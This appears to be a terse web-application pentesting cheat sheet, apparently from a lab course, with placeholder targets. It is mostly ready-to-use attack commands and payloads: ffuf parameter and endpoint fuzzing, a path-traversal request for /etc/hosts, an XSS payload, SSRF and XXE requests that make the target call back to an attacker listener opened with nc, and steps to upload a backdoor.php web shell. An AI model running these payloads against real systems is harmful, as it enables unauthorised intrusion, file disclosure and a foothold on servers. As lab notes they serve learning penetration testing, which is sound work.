Information Disclosure:
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<IP>/?FUZZ=test_value -fs <VALUE>


Brute with script brute_API.py


File Upload:
Check directory and content type
Upload backdoor.php to server
Use script web_shell.py


LFI:
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://<IP>/<API_NAME>/FUZZ
curl http://<IP>/<API_NAME>/<ENDPOINT>/..%2f..%2f..%2f..%2fetc%2fhosts


XSS:
<script>alert(document.domain)</script>
URL Encoded: %3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E


SSRF:
nc -nlvp <PORT>
curl "http://<TARGET IP>/<ENDPOINT>/<METHOD>?id=http://<VPN/TUN Adapter IP>:<PORT>"
Base64 (or else) encode: echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64
curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"


Regular Expression Denial of Service (ReDoS):
curl "http://<TARGET IP>:3000/<API_NAME>/<METHOD>?email=test_value"
Check regex101.com


XML External Entity (XXE) Injection:

First, we will need to append a DOCTYPE to this request.

What is a DOCTYPE?

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).

<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>

nc -nlvp <PORT>

curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
